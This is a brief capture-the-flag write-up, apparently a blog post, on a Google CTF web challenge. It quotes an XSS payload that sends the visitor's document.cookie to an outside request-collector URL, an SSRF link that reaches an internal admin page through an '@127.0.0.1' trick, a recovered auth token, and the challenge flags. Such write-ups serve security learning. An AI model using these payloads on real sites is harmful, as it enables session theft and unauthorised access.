---
title: cookie
layout: post
dir: /csec-writeups
---

<h2> Methodology: </h2>
* tried this:
<img src = "{{ page.dir }}/assets/google-ctf/cookie1.png" alt="">

* also tried this method: 
<img src = "{{ page.dir }}/assets/google-ctf/cookie2.png" alt="">

* The statement encoded above states "javascript:document.location='https://postb.in/b/1591988477067-4363618670031/?cookie='+document.cookie;" 
* flag: CTF{3mbr4c3\_the\_c00k1e\_w0r1d\_ord3r}
* auth: TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz
* the auth gives us the admin link, and to get the next flag, we do an ssrf attack
* there is a link to a video that makes a request to the server from the server; we replace that request with a request to localhost as shown below
* full link: http://cwo-xss.web.ctfcompetition.com/watch?livestream=http://cwo-xss.web.ctfcompetition.com@127.0.0.1/admin/controls
* snippet of code used to craft payload found here: https://github.com/dillonwu-97/csec-code/blob/master/google_ctf/beginner_2019/cookie/payload.py
* flag: CTF{WhatIsThisCookieFriendSpaceBookPlusAllAccessRedPremiumThingLooksYummy}